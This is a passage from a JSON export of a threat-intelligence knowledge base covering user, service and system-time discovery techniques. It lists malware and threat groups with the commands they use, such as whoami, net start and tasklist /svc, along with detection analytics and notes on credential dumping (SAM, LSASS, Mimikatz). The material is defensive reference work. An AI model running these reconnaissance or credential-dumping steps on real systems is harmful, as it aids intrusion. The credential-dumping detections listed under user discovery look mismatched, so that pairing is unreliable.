        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the query user and whoami commands as part of their advanced reconnaissance.[142]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.[143]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.[144][132]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT sent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2.[145]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has commands to get the current user's name and SID.[146]"
      },
      {
        "id": "S0441",
        "name": "PowerShower",
        "description": "PowerShower has the ability to identify the current user on the infected host.[147]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS has the ability to identify the username on the compromised host.[148]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may collect information about the currently logged in user by running whoami on a victim.[149]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "A module in Prikormka collects information from the victim about the current user name.[150]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.[151]"
      },
      {
        "id": "S1032",
        "name": "PyDCrypt",
        "description": "PyDCrypt has probed victim machines with whoami and has collected the username from the machine.[152]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can identify the user name on a compromised system.[153][154]"
      },
      {
        "id": "S0269",
        "name": "QUADAGENT",
        "description": "QUADAGENT gathers the victim username.[155]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can enumerate the username and account type.[156]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA runs the whoami and query user commands.[157]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can gather system owner information, including user and administrator privileges.[158]"
      },
      {
        "id": "S0172",
        "name": "Reaver",
        "description": "Reaver collects the victim's username.[159]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions.[160]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec can obtain information about the current user.[161]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT gathers the username from the system.[162]"
      },
      {
        "id": "S0258",
        "name": "RGDoor",
        "description": "RGDoor executes the whoami on the victim’s machine.[163]"
      },
      {
        "id": "S0433",
        "name": "Rifdoor",
        "description": "Rifdoor has the ability to identify the username on the compromised host.[86]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can detect the username of the infected host.[164]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin collects the victim’s username and whether that user is an admin.[165]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can collect the username from a compromised host.[166]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can obtain the victim username and permissions.[167]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type has run tests to determine the privilege level of the compromised user.[122]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can collect the username from a compromised host.[168]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has collected the username from a compromised host.[169]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to identify the user on a compromised host.[77]"
      },
      {
        "id": "S0382",
        "name": "ServHelper",
        "description": "ServHelper will attempt to enumerate the username of the victim.[170]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has collected the username of the victim system.[171]"
      },
      {
        "id": "S0450",
        "name": "SHARPSTATS",
        "description": "SHARPSTATS has the ability to identify the username on the compromised host.[148]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist can collect the username on a targeted system.[140]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used tools to identify the user of a compromised host.[172]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can gather a list of logged on users.[173]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has collected the username from a victim machine.[174]"
      },
      {
        "id": "S1035",
        "name": "Small Sieve",
        "description": "Small Sieve can obtain the id of a logged in user.[175]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has used whoami commands to identify system owners.[176]"
      },
      {
        "id": "S0627",
        "name": "SodaMaster",
        "description": "SodaMaster can identify the username on a compromised host.[177]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can execute getinfo  to identify the username on a compromised host.[178][179]"
      },
      {
        "id": "S0543",
        "name": "Spark",
        "description": "Spark has run the whoami command and has a built-in command to identify the user logged in.[180]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp uses the whoami command. [181]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle can collect the user name from a compromised host.[182]"
      },
      {
        "id": "S0058",
        "name": "SslMM",
        "description": "SslMM sends the logged-on username to its hard-coded C2.[183]"
      },
      {
        "id": "S1037",
        "name": "STARWHALE",
        "description": "STARWHALE can gather the username from an infected host.[184][185]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers the registered user and primary owner name via WMI.[186]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can collect the user name from the victim's machine.[187]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected the username from a compromised host.[188][189]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can collect the username from an infected host.[190]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck gathers user names from infected hosts.[191]"
      },
      {
        "id": "S0060",
        "name": "Sys10",
        "description": "Sys10 collects the account name of the logged-in user and sends it to the C2.[183]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can collect the username from a compromised host.[192]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.[193]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has used whoami to collect system user information.[40]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can identify the user and groups the user belongs to on a compromised host.[194]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can gather information about the user on a compromised host.[195]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper used letmein to scan for saved usernames on the target system.[196]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can retrieve usernames.[197]"
      },
      {
        "id": "S0130",
        "name": "Unknown Logger",
        "description": "Unknown Logger can obtain information about the victim usernames.[198]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT has the capability to collect the current logged on user’s username from a machine.[199]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can gather information regarding the user.[200]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN gathers the username from the victim’s machine.[201]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has executed the PowerShell command Get-EventLog security -instanceid 4624 to identify associated user and computer account names.[202][203]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can identify the current username on the victim system.[204]"
      },
      {
        "id": "S0514",
        "name": "WellMess",
        "description": "WellMess can collect the username on the victim machine to send to C2.[205]"
      },
      {
        "id": "S0155",
        "name": "WINDSHIELD",
        "description": "WINDSHIELD can gather the victim user name.[206]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used malware to identify the username on a compromised host.[207]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can gather information on the victim username.[83]"
      },
      {
        "id": "S0059",
        "name": "WinMM",
        "description": "WinMM uses NetUser-GetInfo to identify that it is running under an \"Admin\" account on the local system.[183]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used \"whoami\" to identify the local user and their privileges.[208]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can retrieve a list of user accounts and usernames from an infected machine.[209]"
      },
      {
        "id": "S0161",
        "name": "XAgentOSX",
        "description": "XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user.[210]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty collects the victim’s username.[211]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy gets the username from the system.[212][213]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.[214]"
      },
      {
        "id": "S0350",
        "name": "zwShell",
        "description": "zwShell can obtain the name of the logged-in user on the victim.[133]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can collect the owner and organization information from the target workstation.[215]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ can collect the username from a compromised host.[216]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Access",
        "detects": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. [217] [218] [219] Note: Domain controllers may not log replication requests originating from the default domain controller account. [220]. Monitor for replication requests [221] from IPs not associated with known domain controllers. [222]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Look for command-lines that invoke AuditD or the Security Accounts Manager (SAM). Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, [223] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Note: Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on abuse of CMSTP."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for hash dumpers opening the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM). Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised  Valid Accounts in-use by adversaries may help as well."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for unexpected processes interacting with lsass.exe.[224] Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.LinuxTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path /proc/<pid>/maps, where the <pid> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may be indicative of credential dumping. On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for any instances of at being created, therefore implying the querying or creation of tasks. If this tools is commonly used in your environment (e.g., by system administrators) this may lead to false positives and this analytic will therefore require tuning.  Analytic 1 - Suspicious Process Execution processes = filter processes where (  (event_id == \"1\" OR event_id == \"4688\") AND  exe == \"at.exe\")"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Access",
        "detects": "Monitor for the SAM registry key being accessed that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "System Service Discovery",
    "Code": "T1007",
    "Description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "Mitigation": [
      {
        "id": "G0018",
        "name": "admin@338",
        "description": "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: net start >> %temp%\\download[1]"
      },
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 used the commands net start and tasklist to get a listing of the services on the system.[2]"
      },
      {
        "id": "G0143",
        "name": "Aquatic Panda",
        "description": "Aquatic Panda has attempted to discover services for third party EDR products.[3]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk can enumerate all services running on a compromised host.[4]"
      },
      {
        "id": "S0127",
        "name": "BBSRAT",
        "description": "BBSRAT can query service configuration information.[5]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem.[6]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can check whether the service name FAX is present.[7]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has used TROJ_GETVERSION to discover system services.[8]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell can obtain a list of the services from a system.[9]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used net start and net use for system service discovery.[10]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can enumerate services on compromised hosts.[11]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie runs the command: net start >> %TEMP%\\info.dat on a victim.[12]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can query service status using QueryServiceStatusEx function.[13]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can retrieve information about a compromised system's running services.[14]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to identify running services on a compromised host.[15]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has used Tasklist to obtain information from a compromised host.[16]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "Elise executes net start after initial communication is made to the remote server.[17]"
      },
      {
        "id": "S0082",
        "name": "Emissary",
        "description": "Emissary has the capability to execute the command net start to interact with services.[18]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the tasklist /svc command to list the services on the system.[19]"
      },
      {
        "id": "S0049",
        "name": "GeminiDuke",
        "description": "GeminiDuke collects information on programs and services on the victim that are configured to automatically run at startup.[20]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT has a feature to list the available services on the system.[21]"
      },
      {
        "id": "S0342",
        "name": "GreyEnergy",
        "description": "GreyEnergy enumerates all Windows services.[22]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can check if it is running as a service on a compromised host.[23]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to retrieve a list of services on the infected host.[24]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can monitor services.[25][26]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro can list all services and their configurations.[27]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system.[28]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can obtain running services on the victim.[29]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe can list running services.[30]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can list running services.[31]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can list local services.[32]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang performs service discovery using net start commands.[33]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used an instrumentor script to gather the names of all services running on a victim's system.[34]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects a list of running services with the command tasklist /svc.[35]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack can enumerate services on the victim machine.[36]"
      },
      {
        "id": "S0039",
        "name": "Net",
        "description": "The net start command can be used in Net to find information about Windows services.[37]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used sc query on a victim to gather information about services.[38]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the net start command as part of their initial reconnaissance.[39]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used the tasklist command to search for one of its backdoors.[40]"
      },
      {
        "id": "G0033",
        "name": "Poseidon Group",
        "description": "After compromising a victim, Poseidon Group discovers all running services.[41]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can enumerate service and service permission information.[42]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can create and register a service for execution.[43]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA uses tasklist /svc to display running tasks.[44]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can enumerate active services.[45]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type runs the command net start on a victim.[46]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to execute the net start command.[47]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can search for modifiable services that could be used for privilege escalation.[48]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has the capability to enumerate services.[49]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can enumerate services on a victim machine.[50]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.[51]"
      },
      {
        "id": "S0018",
        "name": "Sykipot",
        "description": "Sykipot may use net start to display running services.[52]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck enumerates all running services.[53][54]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can collect a list of services on a victim machine.[55]"
      },
      {
        "id": "S0057",
        "name": "Tasklist",
        "description": "Tasklist can be used to discover services running on a system.[56]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them.[57]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot collects a list of install programs and services on the system’s machine.[58]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.[19]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has gathered information about running services.[59]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer queries the system to identify existing services.[60]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can enumerate services.[61]"
      },
      {
        "id": "S0086",
        "name": "ZLib",
        "description": "ZLib has the ability to discover and manipulate Windows services.[46]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can check the services on the system.[62]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls associated with gathering information about registered local system services, such as QueryServiceStatusEx. Other Windows API calls worth monitoring include EnumServicesStatusExA, which can be used to enumerate services in the service control manager database.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes with arguments that may try to get information about registered services. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). For event id 4688, depending on Windows version, you might need to enable  Administrative Templates\\System\\Audit Process Creation\\Include command line in process creation events  group policy to include command line in process creation events. Analytic 1 -  Suspicious Processes  suspicious_processes = filter processes where (event_id == \"1\" OR event_id == \"4688\") AND  ((command_line LIKE '%sc%' AND command_line LIKE '%query%') OR    (command_line LIKE '%tasklist%' AND command_line LIKE '%/svc%') OR   (command_line LIKE '%systemctl%' AND command_line LIKE '%--type=service%') OR   (command_line LIKE '%net%' AND command_line LIKE '%start%'))"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "System Time Discovery",
    "Code": "T1124",
    "Description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. [1][2]System time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.[2]On network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.[3]This information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job[4], or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.[5]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can collect the timestamp from the victim’s machine.[6]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can pull a timestamp from the victim's machine.[7]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth collects the timestamp from the infected machine. [8]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has checked the system time before and after encryption.[9]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can collect the time zone information from the system.[10][11]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can obtain the DATETIME from a compromised machine.[12]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can collect the time on the compromised host.[13][14]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear has the ability to determine local time on a compromised host.[15]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal can check the system time set on the infected host.[16]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can collect the local time on a compromised host.[17]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has used net time to check the local time on a target system.[18]"
      },
      {
        "id": "S0471",
        "name": "build_downer",
        "description": "build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.[19]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used the command net view /all time to gather the local time of a compromised network.[20]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can collect the current time zone information from the victim’s machine.[21]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon uses the command net time \\127.0.0.1 to get information the system’s time.[22]"
      },
      {
        "id": "S1043",
        "name": "ccf32",
        "description": "ccf32 can determine the local time on targeted machines.[23]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used time /t and net time \\ip/hostname for system time discovery.[24]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can determine the current time.[25]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday).[26]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.[27][28]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson has the ability to determine the date and time on a compromised host.[29]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel malware can obtain system time from a compromised host.[30]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can collect the time zone information from the system.[31]"
      },
      {
        "id": "S1033",
        "name": "DCSrv",
        "description": "DCSrv can compare the current time on an infected host with a configuration value to determine when to start the encryption process.[32]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can use the GetTickCount and GetSystemTimeAsFileTime API calls to inspect system time.[33]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor contains functionality to query the local/system time.[34]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the net time command  to get the system time from the machine and collect the current date and time zone information.[35]"
      },
      {
        "id": "S0396",
        "name": "EvilBunny",
        "description": "EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.[36]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT gathers the time zone information from the victim’s machine.[37]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can check system time to help determine when changes were made to specified files.[23]"
      },
      {
        "id": "S0588",
        "name": "GoldMax",
        "description": "GoldMax can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server.[38][39]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can determine the time on the victim machine via IPinfo.[40]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT can obtain the date and time of a system.[41]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert can collect the date and time from a compromised host.[42][43]"
      },
      {
        "id": "S0417",
        "name": "GRIFFON",
        "description": "GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.[44]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa used a function to gather the current time.[45]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has been observed collecting system time from victim machines.[46]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole gathers the local system time from the victim’s machine.[47][48]"
      },
      {
        "id": "S1051",
        "name": "KEYPLUG",
        "description": "KEYPLUG can obtain the current tick count of an infected computer.[49]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server.[50]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo uses JavaScript to get the system time.[51]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind obtains the victim's current time.[52]"
      },
      {
        "id": "S0039",
        "name": "Net",
        "description": "The net time command can be used in Net to determine the local or remote system time.[53]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI can collect the current timestamp of the victim's machine.[54]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum can obtain the date and time of the compromised system.[55]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.[56]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
